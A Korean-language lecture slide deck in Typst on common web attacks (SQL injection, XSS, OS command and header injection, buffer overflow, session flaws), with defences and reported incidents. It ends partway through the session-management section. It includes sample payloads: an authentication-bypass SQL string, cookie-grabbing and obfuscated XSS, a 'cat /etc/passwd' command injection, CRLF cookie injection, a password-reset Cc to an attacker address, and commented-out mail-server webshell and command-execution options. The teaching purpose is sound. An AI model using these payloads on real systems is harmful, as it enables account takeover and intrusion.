#import "style.typ": font-family, pallete, section, theme, url, vulnerability-chart

#show: theme.with(
  title: "웹 서비스를 위협하는 공격들",
  author: "Jonghyeon PARK",
  hero: [
    #let _fgcolor = pallete.silver.I
    #rect(
      width: 100%,
      height: 60%,
      fill: _fgcolor,
      outset: 0%,
      inset: (left: 5em, y: 3em)
    )[
      #align(horizon)[#text(fill: white)[
        #text(size: 40pt, weight: "bold")[
          웹 서비스를 위협하는 공격들
        ]\

        #text(size: 22pt, weight: "medium")[
          \~일반적으로 널리 보고된 사례를 중심으로\~
        ]
      ]]
    ]
    #align(center + horizon)[#text(fill: _fgcolor, size: 22pt, weight: "medium")[
      Jonghyeon PARK\
      
      #text(size: .7em)[
        2026-01\
        General Exchange Student, Faculty of Science and Engineering, Saga University\
        #link("mailto:25931028@edu.cc.sage-u.ac.jp")[25931028\@edu.cc.saga-u.ac.jp]\; #link("mailto:jonghyeon@jnu.ac.kr")[jonghyeon\@jnu.ac.kr]
      ]
      \
      \
    ]]
  ]
)

#pagebreak()
#pagebreak()

#section(
  title: "임의 코드 및 로직 실행",
  hero: [
    #align(center + horizon)[
      #stack(
        dir: ltr,
        spacing: 1em,
        rect(fill: pallete.silver.V, inset: 1em, radius: .5em)[#text(fill: white)[*User Input*\ (Data)]],
        align(horizon)[$arrow.r$ Interpreted $arrow.r$],
        rect(fill: pallete.ruby.I, inset: 1em, radius: .5em)[#text(fill: white)[*Execution*\ (Code)]],
      )
      #v(1em)
      #text(size: 1.3em, weight: "bold")[Arbitrary Code Execution (ACE)]
      \
      입력값이 검증 없이\
      시스템의 명령어나 로직으로 수행
    ]
  ]
)[
  - 가장 치명적인 공격 유형

  - 어느 형태의 공격으로든 발전시킬 수 있음

  #pagebreak()

  - 인젝션 공격
  
    - 인젝션 공격은 값(value)이 실행 로직으로 동작 가능한 모든 상황에서 발생 가능
  
    - 값이 절대로 실행 가능하지 않도록 해야함
    
    - 혹은 값이 실행 코드를 예측 불가능하게 분기시키지 않도록 해야함

  #pagebreak()

  /*
  - 프로그래밍을 처음 배우면서 배열/리스트 개념을 접할 때...

    ```cs
    int arr_item_0 = -1;
    int arr_item_1 = -1;
    int arr_item_2 = -1;
    
    for (int i = 0; i < 3; i++) {
      string var_name = $"arr_item_{i}";
    }
    ```

    #quote[
      이렇게 하면 `var_name`이 변수 이름이 되었으니까, 머리 아픈 배열 대신 어떻게 비슷하게 할 수 있지 않을까??
    ]
  
  #pagebreak()

  - 실제로 JavaScript 등에서 `eval` 함수를 사용하면 가능함
    ```js
    var arrItem0 = -1;
    var arrItem1 = -2;
    var arrItem2 = -3;

    for (let i = 0; i < 3; i++) {
      let varName = "arrItem" + i;
      console.log(eval(varName));
    }
    ```

    ```
    -1
    -2
    -3
    ```

  #pagebreak()

  #figure(
    image("static/stackoverflow-when-is-javascripts-eval-not-evil.png"),
    caption: [「eval is evil」 @eval-is-evil]
  )
  
  #pagebreak()

  */

  - 임의 코드 실행 취약점 (Arbitrary Code Execution, ACE vulnerability)\

    \ 
    값이 실행 가능하다\
    $=$ 외부에서 원하는 코드를 임의로 실행할 수 있다\
    $=$ 악의적인 코드를 실행할 수 있다

  \

  - 인젝션 공격은 임의 코드 실행 취약점을 실현할 수 있는 일반적인 방법 중 하나
]

#section(
  title: "임의 코드 및 로직 실행/SQL 인젝션",
  hero: [
    #vulnerability-chart((
      ([치명성], [매우 높음], 100%),
      ([공격 난이도], [낮음], 30%),
      ([파장], [매우 큼], 100%),
      ([취약점 완화 난도], [매우 낮음], 20%),
    ))
  ]
)[
  - 클라이언트의 입력값을 조작하여 서버의 데이터베이스를 공격

  - 사용자가 입력한 데이터를 SQL 문법으로 인식시키는 것으로 실현

  \

  - SQL 쿼리를 문자열#super[string] 값으로 생성해 사용하여 발생

  #pagebreak()

  - 영향

    - 데이터베이스 상의 비공개 데이터에 비인가 열람 가능
    
    - 데이터베이스 변조, 제거, 덤프

    - 인증 우회에 의한 부정 로그인

    - 프로시저를 이용해 OS 명령 실행

  #pagebreak()

  - 공격 벡터

    - 공격 표면:\
      #text(size: .8em)[이 명령은 아이디, 비밀번호가 DB의 `user_table` 상의 데이터와 동일할 경우에만 `user` 데이터를 가져옴]
      ```sql
      SELECT user FROM user_table WHERE id='user-id' AND password='user-password';
      ```
    - `id`와 `password` 필드에 다음 값 입력:
      #text(size: .8em)[#table(
        columns: (1fr, 2fr, 1fr, 2fr),
        inset: (y: .5em),
        [#text(size: .8em)[아이디]], `admin`, [#text(size: .8em)[비밀번호]], `' or '1' = '1`
      )]

  #pagebreak()

  - 공격 벡터
  
    - ```sql
      SELECT user FROM user_table WHERE id='user-id' AND password='user-password';
      ```
    - #text(size: .8em)[#table(
        columns: 2,
        inset: (y: .5em),
        [#text(size: .8em)[아이디]], `admin`,
        [#text(size: .8em)[비밀번호]], `' or '1' = '1`
      )]
    - 결과
      ```sql
      SELECT user FROM user_table WHERE id='admin' AND password=' ' OR '1' = '1';
      ```

  #pagebreak()
  
  - 공격 벡터
    - 결과
      ```sql
      SELECT user FROM user_table WHERE 
      ```

      ```sql
      id='admin' AND password=' '  -- false
      ```

      ```sql
      OR
      ```

      ```sql
      '1' = '1' -- true
      ```
    
    - `admin` 계정에 대한 정보를 반환하고 쿼리가 종료

    - 비밀번호를 몰라도 올바른 비밀번호를 입력한 것처럼 동작

  #pagebreak()

  - 대책
    - SQL 파라미터 바인딩 사용
      - SQL 쿼리문과 데이터 분리 API
      - 예: Python + SQLite
        ```python
        query = "INSERT INTO users (name, age) VALUES (?, ?)"
        cursor.execute(query, (name, age))
        ```
      - 예: PHP
        ```php
        $stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
        $stmt->execute([$username, $password]);
        ```
  #pagebreak()
  
  - 대책
  
    - 입력 값 검증 및 필터링
    
      - 서버 측에서 허용된 패턴의 입력만 받거나 특수 문자를 제거
      /*
        - 예: 숫자만 입력 가능한 필드 $->$ 정수형으로 변환
        - 예: 정규표현식을 사용하여 이상값 필터링
        - 예: 입력값의 최대 길이 제한

      - 데이터 처리를 복잡하게 하고, 코드 재사용성 저하 가능성 있음

  #pagebreak()

  - 대책
    */
    \
    - ORM 사용

      - 쿼리문으로 직접 DB를 제어하지 않고 ORM(Object-Relational Mapping)을 통해 DB를 제어

      //  - Hibernate, SQLAlchemy, Django ORM, Prisma 등

      - 쿼리문의 직접적인 튜닝이 불가하므로, 성능 저하 가능성 있음

  #pagebreak()
  /*
  - 대책
  
    - 최소 권한 원칙 준수

      - 읽기/쓰기 권한을 DB 엑세스 계정 당 필요한 테이블에만 제한적으로 부여

    - 프로덕션에 SQL 오류 메시지를 표시하지 말 것
    
  #pagebreak()
  */
  
  - 사례
    - 미국의 한 보안 연구원이 불법 주차 단속의 벌금을 피하기 위해 차량 번호판을 「Null」로 등록 @wired-null-license-plate \
      #figure(
        image("static/sql-injection-null-license-plate.webp", width: 35%),
        caption: [「NULL」 자동차 번호판 @droogi-null-license-plate],
      )
      - 수 개월 후 \$12,000의 벌금 청구서를 받음
      - 차량 번호가 누락된 벌금 청구서가 전부 Null 번호판에 부과됨

  #pagebreak()

  - 사례

    - 2007년 미국 세븐일레븐에 SQL 인젝션 공격 @wired-heartland-sentencing
      - 1억 3천만 건의 신용카드 번호 유출
      - 공격자는 이후 20년형 선고받음 @us-court-new-jersy-criminal-09-626

    - 2019년 게임 〈포트나이트〉에 SQL 인젝션 취약점 발견 @thehackernews-fortnite-account-hacked
      - XSS 공격, OAuth 계정 탈취 등과 결합하여 계정 탈취 가능
      - 플레이어 개인정보에 접근, 인게임 화폐 구매, 게임 아이템 구입 후 현금화 가능
      - 대규모 피해가 발생하기 전에 취약점 패치
]

#section(
  title: "임의 코드 및 로직 실행/XSS 공격",
  hero: [
    #vulnerability-chart((
      ([치명성], [높음], 75%),
      ([공격 난이도], [매우 낮음], 20%),
      ([파장], [큼], 65%),
      ([취약점 완화 난도], [보통], 40%),
    ))
  ]
)[
  - XSS(Cross-site Scripting) 

  - 공격자가 사이트에 악의적인 스크립트를 넣는 공격

  - 사이트에 접속한 사용자는 삽입된 코드를 실행하게 됨
  
  \
  
  - SQL 인젝션과 함께 웹 상에서 가장 기초적인 취약점 공격 방법으로 여겨짐

  #pagebreak()

  - 목적
    - 트롤링(trolling): 단순히 사용자 불편을 초래
  #grid(
    columns: (1fr, 1fr),
    inset: (x: .5em),
    [
      #figure(
        image("static/xss-trolling-large-div.png"),
        caption: [(재현) 나무위키 XSS 공격 사건 당시 사이트 내 토론 쓰레드: 거대한 div 요소가 화면을 가림 @alphawiki-namuwiki-xss-attack@theseed-namuwiki-xss-attack]
      )
    ],
    [
      #figure(
        image("static/xss-trolling-restaurance.jpg"),
        caption: [
          2017년 전후로 한국에서 유행한 일명 "레스토랑스" 트롤링@namuwiki-high-quality-restaurant \
          웹 사이트 내의 모든 요소를 회전시키다가, 최종적으로 게임 〈히어로즈 오브 더 스톰〉의 로고, "시공의 폭풍" 속으로 모든 요소를 빨려들어가게 연출
        ]
      )
    ]
  )

  #pagebreak()
  
  - 목적
  
    - 쿠키, 토큰 등 민감 정보 탈취

    - 로컬에 저장된 액세스 키 등을 획득하여 사용자 계정에 접근

  \

  - 공격 표면

    ```typescript
    let e: HTMLElement; let fe: HTMLTextAreaElement;
    // fe의 값을 필터링하지 않고 그대로 HTML 코드로 사용
    e.innerHTML = fe.value;
    ```

  #pagebreak()

  - 공격 벡터

    - 스크립트 태그 삽입
      ```html
      <script>$('textarea').val(document.cookie);$('form.new-thread-form').submit();</script>
      ```

    - 자바스크립트 링크 삽입
      ```html
      <a href="javascript:alert('XSS')">XSS</a>
      ```
      
    - 이벤트 속성 삽입
      ```html
      <img src="#" onerror="alert('XSS')">
      ```
  #pagebreak()

  - 공격 벡터

    - 블랙리스트 우회: 자주 사용하지 않는 태그와 속성 사용
      ```html
      <ruby oncopy="alert('XSS')">XSS</ruby>
      ```

    - 내용 난독화 #text(size: .7em)[HTML 인코드: #url("https://mothereff.in/html-entities")]
      ```html
      <a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#xA;&#x63;
      &#x72;&#x69;&#x70;&#x74;&#xA;&#x3A;&#xA;&#x61;&#x6C;
      &#x65;&#x72;&#x74;&#xA;&#x28;&#x27;&#x58;&#x53;&#x53;
      &#x27;&#x29;">XSS</a>
      ```

  #pagebreak()
  
  - 공격 벡터
  
    - 스크립트 난독화 #text(size: .7em)[#url("https://utf-8.jp/public/aaencode.html")]
    
  #text(size: .5em)[```
  ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ ['_']; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) ['c']+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ) [ﾟΘﾟ]+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) ['c']+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ) .ﾟｰﾟﾉ+ (ﾟДﾟ) .ﾟｰﾟﾉ+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) ['c']+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ) ['c']+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ ((ﾟｰﾟ) + (ﾟｰﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ) ['c']+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) ['c']+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ (o^_^o)+ (ﾟДﾟ) .ﾟｰﾟﾉ+ ((ﾟｰﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ) ['c']+ (ﾟДﾟ)[ﾟεﾟ]+(oﾟｰﾟo)+ (ﾟДﾟ) .ﾟΘﾟﾉ+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ) .ﾟДﾟﾉ+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
  ```]

  #pagebreak()

  - 대책
  
    - 입력 필터: 문자열 필터 혹은 문자열 필터가 구현된 API 사용
    
      - XSS에 취약한 API는 대체 API가 이미 존재함
      
      - `element.innerHTML`\
        $->$ `element.textContent`, DOMDocument API 사용

      - 많은 상황에서 HTML 태그 인젝션을 필터하기 위해 자동 필터링:\
        `<` $->$ `&lt;` /  `>` $->$ `&gt;`

  #pagebreak()

  - 대책

    - 출력 필터
    
      - HTML5부터 `iframe` 태그에 sandbox 옵션 설정 가능

      - 표준이 구현되지 않은 구버전 브라우저에서는 동작하지 않으므로 보조적으로 사용

    - 콘텐츠 보안 정책 (CSP; Content Security Policy) 사용
]

#section(
  title: "임의 코드 및 로직 실행/OS 커맨드 인젝션",
  hero: [
    #vulnerability-chart((
      ([치명성], [매우 높음], 100%),
      ([공격 난이도], [높음], 70%),
      ([파장], [매우 큼], 100%),
      ([취약점 완화 난도], [쉬움], 20%),
    ))
  ]
)[
  - 사용자 입력이 서버의 OS 명령어로서 실행

  \

  - 영향
    - 서버에서 OS 명령어를 실행하는 주체의 권한에 따라 피해 발생
    - 서버 내 파일 조작: 중요 정보 유출, 설정 파일 변조/삭제 등
    - 부정 시스템 조작: 시스템 종료, 관리자 계정 추가 등
    - 임의 코드 실행: 백도어 설치, 바이러스/봇 감염 등 악의적 동작 수행
    - 공격 경유지로 사용: 다른 시스템 공격(DOS), 스팸 메일 발송 등
    
  #pagebreak()

  - 공격 벡터

    - 외부 프로그램을 호출 가능한 함수, 위험한 함수 등을 사용하는 서버에 공격

    - 예: Perl
      - `open()`, `system()`, `eval()`

    - 예: PHP
      - `exec()`, `passthru()`, `shell_exec()`, `system()`

  #pagebreak()

  - 공격 표면
  #text(size: .8em)[```perl
  #!/usr/bin/perl
  use strict; use warnings; use CGI;
  
  my $cgi = CGI->new;
  print $cgi->header;
  
  # 사용자로부터 IP 주소를 입력받음
  my $ip = $cgi->param('ip');
  
  # 취약점 발생 지점: 사용자 입력을 그대로 시스템 명령어에 연결함
  # 공격자가 입력값으로 "127.0.0.1; cat /etc/passwd"를 넣으면 두 명령어가 모두 실행됨
  my $output = `ping -c 1 $ip`;
  
  print "<pre>$output</pre>";
  ```]

  #pagebreak()

  - 대책
  
    - 쉘을 사용하지 않는 대체 API 사용
      - 예: Perl\
        ```perl
        use Fcntl;
        # open($fh, "<", $filename);
        sysopen($fh, $filename, O_RDONLY);
        ```
        
    - OS 명령을 직접 호출하는 코드 제거: \
    
      동일한 기능을 하는 표준 라이브러리 사용
  
  #pagebreak()

  - 사례

    - IPA에 신고된 사례

      - ASUS 무선 LAN 라우터 `JVNDB-2015-000011` @jvndb-2015-000011
        - 관리 콘솔에서 입력값 처리 미흡으로 발생
        - 로그인 가능한 사용자가 임의 OS 명령 실행 가능

      - Usermin `JVNDB-2014-000057` @jvndb-2014-000057
        - 웹메일 관리 툴에서 발생
        - 로그인한 사용자가 특정한 조작 시 임의 명령 실행 가능
]

#section(
  title: "임의 코드 및 로직 실행/HTTP 헤더 인젝션",
  hero: [
    #vulnerability-chart((
      ([치명성], [보통], 50%),
      ([공격 난이도], [보통], 60%),
      ([파장], [보통], 50%),
      ([취약점 완화 난도], [쉬움], 20%),
    ))
  ]
)[
  - HTTP 요청에 악의적인 문자열을 삽입해 HTTP 응답 조작 
  
  - 사용자가 제공한 매개변수를 정제하지 않고 사용하는 경우에 취약

  #pagebreak()

  - 공격 벡터

    - HTTP 응답 분할: CRLF를 동원한 악의적 문자열 삽입
    
    - GET 파라미터를 그대로 세션 관리에 활용하는 경우, 응답을 오염시킬 수 있음@f5-http-header-injection
      #text(size: .8em)[#grid(
        columns: (1fr, 1fr),
        inset: .5em,
        [
          - `http://abc.me?status=1`
        ],
        [
          - `http://abc.me?status=1 \r\n\r\n<html>(html code)</html>`
        ],
        [
          ```
          HTTP/1.1 200 OK
          ...
          Set-Cookie:status=1
          ```
        ],
        [
          ```
          HTTP/1.1 200 OK
          ...
          Set-Cookie:status=1

          <html>(html code)</html>
          ```
        ]
      )]
      
  #pagebreak()

  - 공격 표면
    - 예: Perl
      #text(size: .8em)[```perl
      $cgi = new CGI;
      $num = $cgi->param('num');
      # 사용자가 num=1 입력 시 -> Location: http://example.jp/index.cgi?num=1
      print "Location: http://example.jp/index.cgi?num=$num\n\n";
      ```]
      
    - 입력값 `3%0D%0ASet-Cookie:SID=evil`으로 공격
      #text(size: .8em)[```
      HTTP/1.x 302 Found
      Location: http://example.jp/index.cgi?num=3
      Set-Cookie: SID=evil
      ...
      ```
      ]

  - 공격 벡터
  
    - #text(size: .8em)[```
        HTTP/1.x 302 Found
        Location: http://example.jp/index.cgi?num=3
        Set-Cookie: SID=evil
        ...
        ```
        ]
        
    - 서버의 의도와 다르게, 공격자가 `Set-Cookie` 헤더를 강제로 삽입함

  #pagebreak()

  - 대책

    - 헤더 출력용 전용 API 사용
    
      - 언어 표준 라이브러리, 프레임워크에서 제공하는 헤더 설정 함수 사용
      
      - 대부분의 최신 API는 헤더 값에 개행 문자가 포함되면 에러를 발생시키거나 자동 제거함

  #pagebreak()
  - 대책
    - 개행 문자(CRLF) 제거
      - API를 사용할 수 없는 경우, 입력값에서 `\r`, `\n`을 반드시 삭제하거나 치환
      - 예: Perl
        ```perl
        $str =~ s/\r|\n//g;
        ```

    - 입력을 헤더에 직접 사용하지 않도록 설계 변경
]


#section(
  title: "임의 코드 및 로직 실행/메일 헤더 인젝션",
  hero: [
    #vulnerability-chart((
      ([치명성], [높음], 60%),
      ([공격 난이도], [보통], 50%),
      ([파장], [보통], 60%),
      ([취약점 완화 난도], [쉬움], 30%),
    ))
  ]
)[
  - 애플리케이션이 이메일을 처리할 때, 사용자 입력값에 대한 검증이 미흡하여 발생하는 취약점

  - 공격자가 CRLF(개행 문자; `%0d%0a`)를 삽입하여 메일 헤더를 조작하거나 본문을 변조


  #pagebreak()

  - 영향
  
    - 스팸 및 피싱:\
      공식 계정을 사칭하여 악성 링크나 가짜 정보를 발송 (`Subject`, `From` 변조)
      
    - 중요 정보 탈취 (Account Takeover)\
      비밀번호 재설정 링크나 2FA 코드가 포함된 메일을 공격자에게 참조(`Cc`, `Bcc`)로 보내 계정 탈취
      
    - 원격 코드 실행 (RCE)\
      메일 전송 라이브러리(PHP `mail()` 등)가 OS 명령어를 호출할 때, 파라미터 주입을 통해 서버 장악 가능


  #pagebreak()

   - 공격 벡터
   
    - 헤더 인젝션을 통한 정보 탈취 @hahwul-email-injection

      - 시나리오: 비밀번호 찾기 기능
        - 정상 요청: `email=victim@domain.com`
        
        - 공격 요청:
          ```http
          POST /reset-password HTTP/1.1
          email=victim@domain.com%0ACc:attacker@domain.com
          ```
  #pagebreak()
  
  - 공격 벡터
  
    - 헤더 인젝션을 통한 정보 탈취 @hahwul-email-injection
      ```http
      POST /reset-password HTTP/1.1
      email=victim@domain.com%0ACc:attacker@domain.com
      ```
          
      - 결과
        - 메일 서버는 개행 문자를 인식하여 `Cc` 헤더를 추가함
        
        - 피해자에게 갈 비밀번호 재설정 링크가 공격자의 메일(`attacker@domain.com`)로도 전송됨
        - 공격자는 링크를 클릭하여 피해자의 계정을 탈취

  #pagebreak()
  
  - 공격 벡터
  
    - 원격 임의 코드 실행 @hahwul-email-injection
      - PHP `mail()` 함수와 MTA(Sendmail, Exim 등)의 연동 과정에서 발생 가능
      
      - 5번째 파라미터(`$additional_parameters`)에 쉘 메타문자나 MTA 옵션을 주입

  /*
  #pagebreak()
  
  - 공격 벡터
  
    - 원격 임의 코드 실행 @hahwul-email-injection
    
      - Sendmail의 `-X` 옵션 이용
      
        - `-X` 옵션은 메일 트래픽을 로그 파일에 기록함
        
        - 공격자가 로그 파일 경로를 웹 루트의 PHP 파일로 지정하고, 메일 본문에 PHP 코드를 삽입
        
        - `email=attacker@site.com -X/var/www/html/shell.php`
        
      - 결과: 웹쉘 생성 및 실행
  
  #pagebreak()
  
  - 공격 벡터
  
    - 원격 임의 코드 실행 @hahwul-email-injection
    
      - Exim의 `-be` 옵션 이용
      
        - `-be` 옵션은 Exim의 확장 변수 테스트 모드를 실행 (Run expansion testing mode)
        
        - `email=attacker@site.com -be ${run{/bin/bash -c "..."}}`
        
      - 결과: 즉시 시스템 명령어 실행
  */
  
  #pagebreak()

  - 대책

    - 사용자로부터 데이터를 받아 메일을 전송할 때
    
      - 지정된 포맷의 데이터 이외에는 처리하지 않도록 제한
      
      - 개행 문자는 다양한 공격 표면으로 활용되므로 필수적으로 처리

    - 헤더와 본문의 분리
      - 사용자 입력값은 가급적 메일 헤더(`To`, `From`, `Subject`)에 직접 사용하지 않고 본문에만 포함되도록 설계
  #pagebreak()

  - 대책
  
    - 전용 라이브러리 사용
    
      - `mail()` 함수나 OS 커맨드를 직접 호출하지 말고, 보안이 검증된 라이브러리(PHPMailer, SwiftMailer 등) 사용
      
      - 최신 버전의 라이브러리를 유지하여 알려진 RCE 취약점(CVE-2016-10033 등) 방어
]

#section(
  title: "임의 코드 및 로직 실행/버퍼 오버플로우",
  hero: [
    #vulnerability-chart((
      ([치명성], [매우 높음], 100%),
      ([공격 난이도], [매우 높음], 90%),
      ([파장], [매우 큼], 100%),
      ([취약점 완화 난도], [높음#footnote[
        의존하는 기술 스택에서 발생하여 소프트웨어 업데이트로 해결 가능한 경우, 취약점 완화 난도는 낮음. 취약점이 발생한 원인이 외부에 있지 않아 직접 코드베이스를 수정해야 하는 경우임.
      ]], 80%),
    ))
  ]
)[
  - 프로그램이 확보한 메모리 영역을 넘어서 데이터를 쓰거나 읽음 @cwe-119

  #figure(
    image("static/cwe-119-diagram.png", width: 50%),
    caption: [버퍼 오버플로우의 개념도 (source: CWE @cwe-119)]
  )

  - 주로 C, C++, 어셈블러 등 메모리를 직접 관리하는 언어로 쓰인 프로그램에서 발생

  #pagebreak()
  
  - 영향
  
    - 서비스 거부 (DoS): 프로그램의 비정상 종료

    - 권한 외 데이터에 접근
    
    - 임의 코드 실행: 반환 주소(Return Address) 등을 덮어씌워 악성 코드 실행 (Shellcode Injection)
    
  #pagebreak()

  - 실현

    - 현대 웹 스택(PHP, Java, Python, Ruby, Go 등)은 언어 단에서 메모리를 관리하므로 버퍼 오버플로우 발생 가능성은 낮음 @cwe-119

    \

    - 인프라, 의존성에 문제가 생겨 취약점이 되는 경우가 있음
      - 언어의 컴파일러/인터프리터/VM
      - 웹앱이 사용하는 라이브러리
      - CGI 등으로 호출되는 레거시 바이너리 프로그램

  #pagebreak()

  - 사례
  
  #grid(
    columns: (2fr, 1.4fr),
    inset: (x: .3em),
    [
      - 하트블리드(Heartbleed) @heartbleed-com
        - OpenSSL의 '하트비트' 패킷의 데이터 크기를 실제와 다르게 전송
        
        - 서버는 메모리에 저장된 다른 정보까지 끌어와 조작된 데이터 크기만큼 패킷을 채워서 반환
    ],
    [
      #figure(
        image("static/xkcd-heartbleed-explanation.png"),
        caption: [xkcd, 하트블리드 버그의 원리 @xkcd-13354]
      )
    ]
  )
    
  #pagebreak()

  - 사례

  #grid(
    columns: (2fr, 1.4fr),
    inset: (x: .3em),
    [
    - 몽고블리드(MongoBleed) 
    
      - 하트블리드와 동일한 문제가  MongoDB에서 발생 @akamai-mongobleed-cve-2025-14847 @codingapple-mongobleed-rainbowsix
      
      - 2025년 12월 발생한 게임 〈레인보우 식스 시즈〉의 해킹 사건이 이 취약점을 이용한 것으로 추정됨@rocketboys-rainbow-six-siege-outage
    ],
    [
      #figure(
        image("static/mongobleed-rainbowsix-siege.png"),
        caption: [
          레인보우 식스 시즈 해킹 사건에서, 공격자는 모든 사용자에게 각각 20억엔 상당의 유료 재화를 부정 지급했다\
          VarsityGaming 영상 캡처 @youtube-varsitygaming-siege-has-been-hacked
        ]
      )
    ]
  )
]
#section(
  title: "세션 관리 및 브라우저 보안/세션 관리 미흡",
  hero: [
    #vulnerability-chart((
      ([치명성], [매우 높음], 90%),
      ([공격 난이도], [보통], 50%),
      ([파장], [매우 큼], 90%),
      ([취약점 완화 난도], [보통#footnote[개별 대책의 완화 난도는 낮으나, 안전한 난수 생성, 쿠키 속성(HttpOnly, Secure) 설정 등 체크해야 할 항목이 많고 로직 설계 단계에서도 고려해야 할 내용이 있음.]], 40%),
    ))
  ]
)[
  - 서버는 사용자를 식별하기 위해 세션(Session)을 사용함

  - 세션 관리가 미흡할 경우 공격자가 타인의 세션 ID를 탈취하거나 추측하여 계정을 장악할 수 있음

  #pagebreak()

  - 주요 취약점 유형
  
    - 세션 식별자 추측: 세션 식별자가 규칙적인 패턴을 갖고 있거나 짧은 길이로 생성된 경우
    
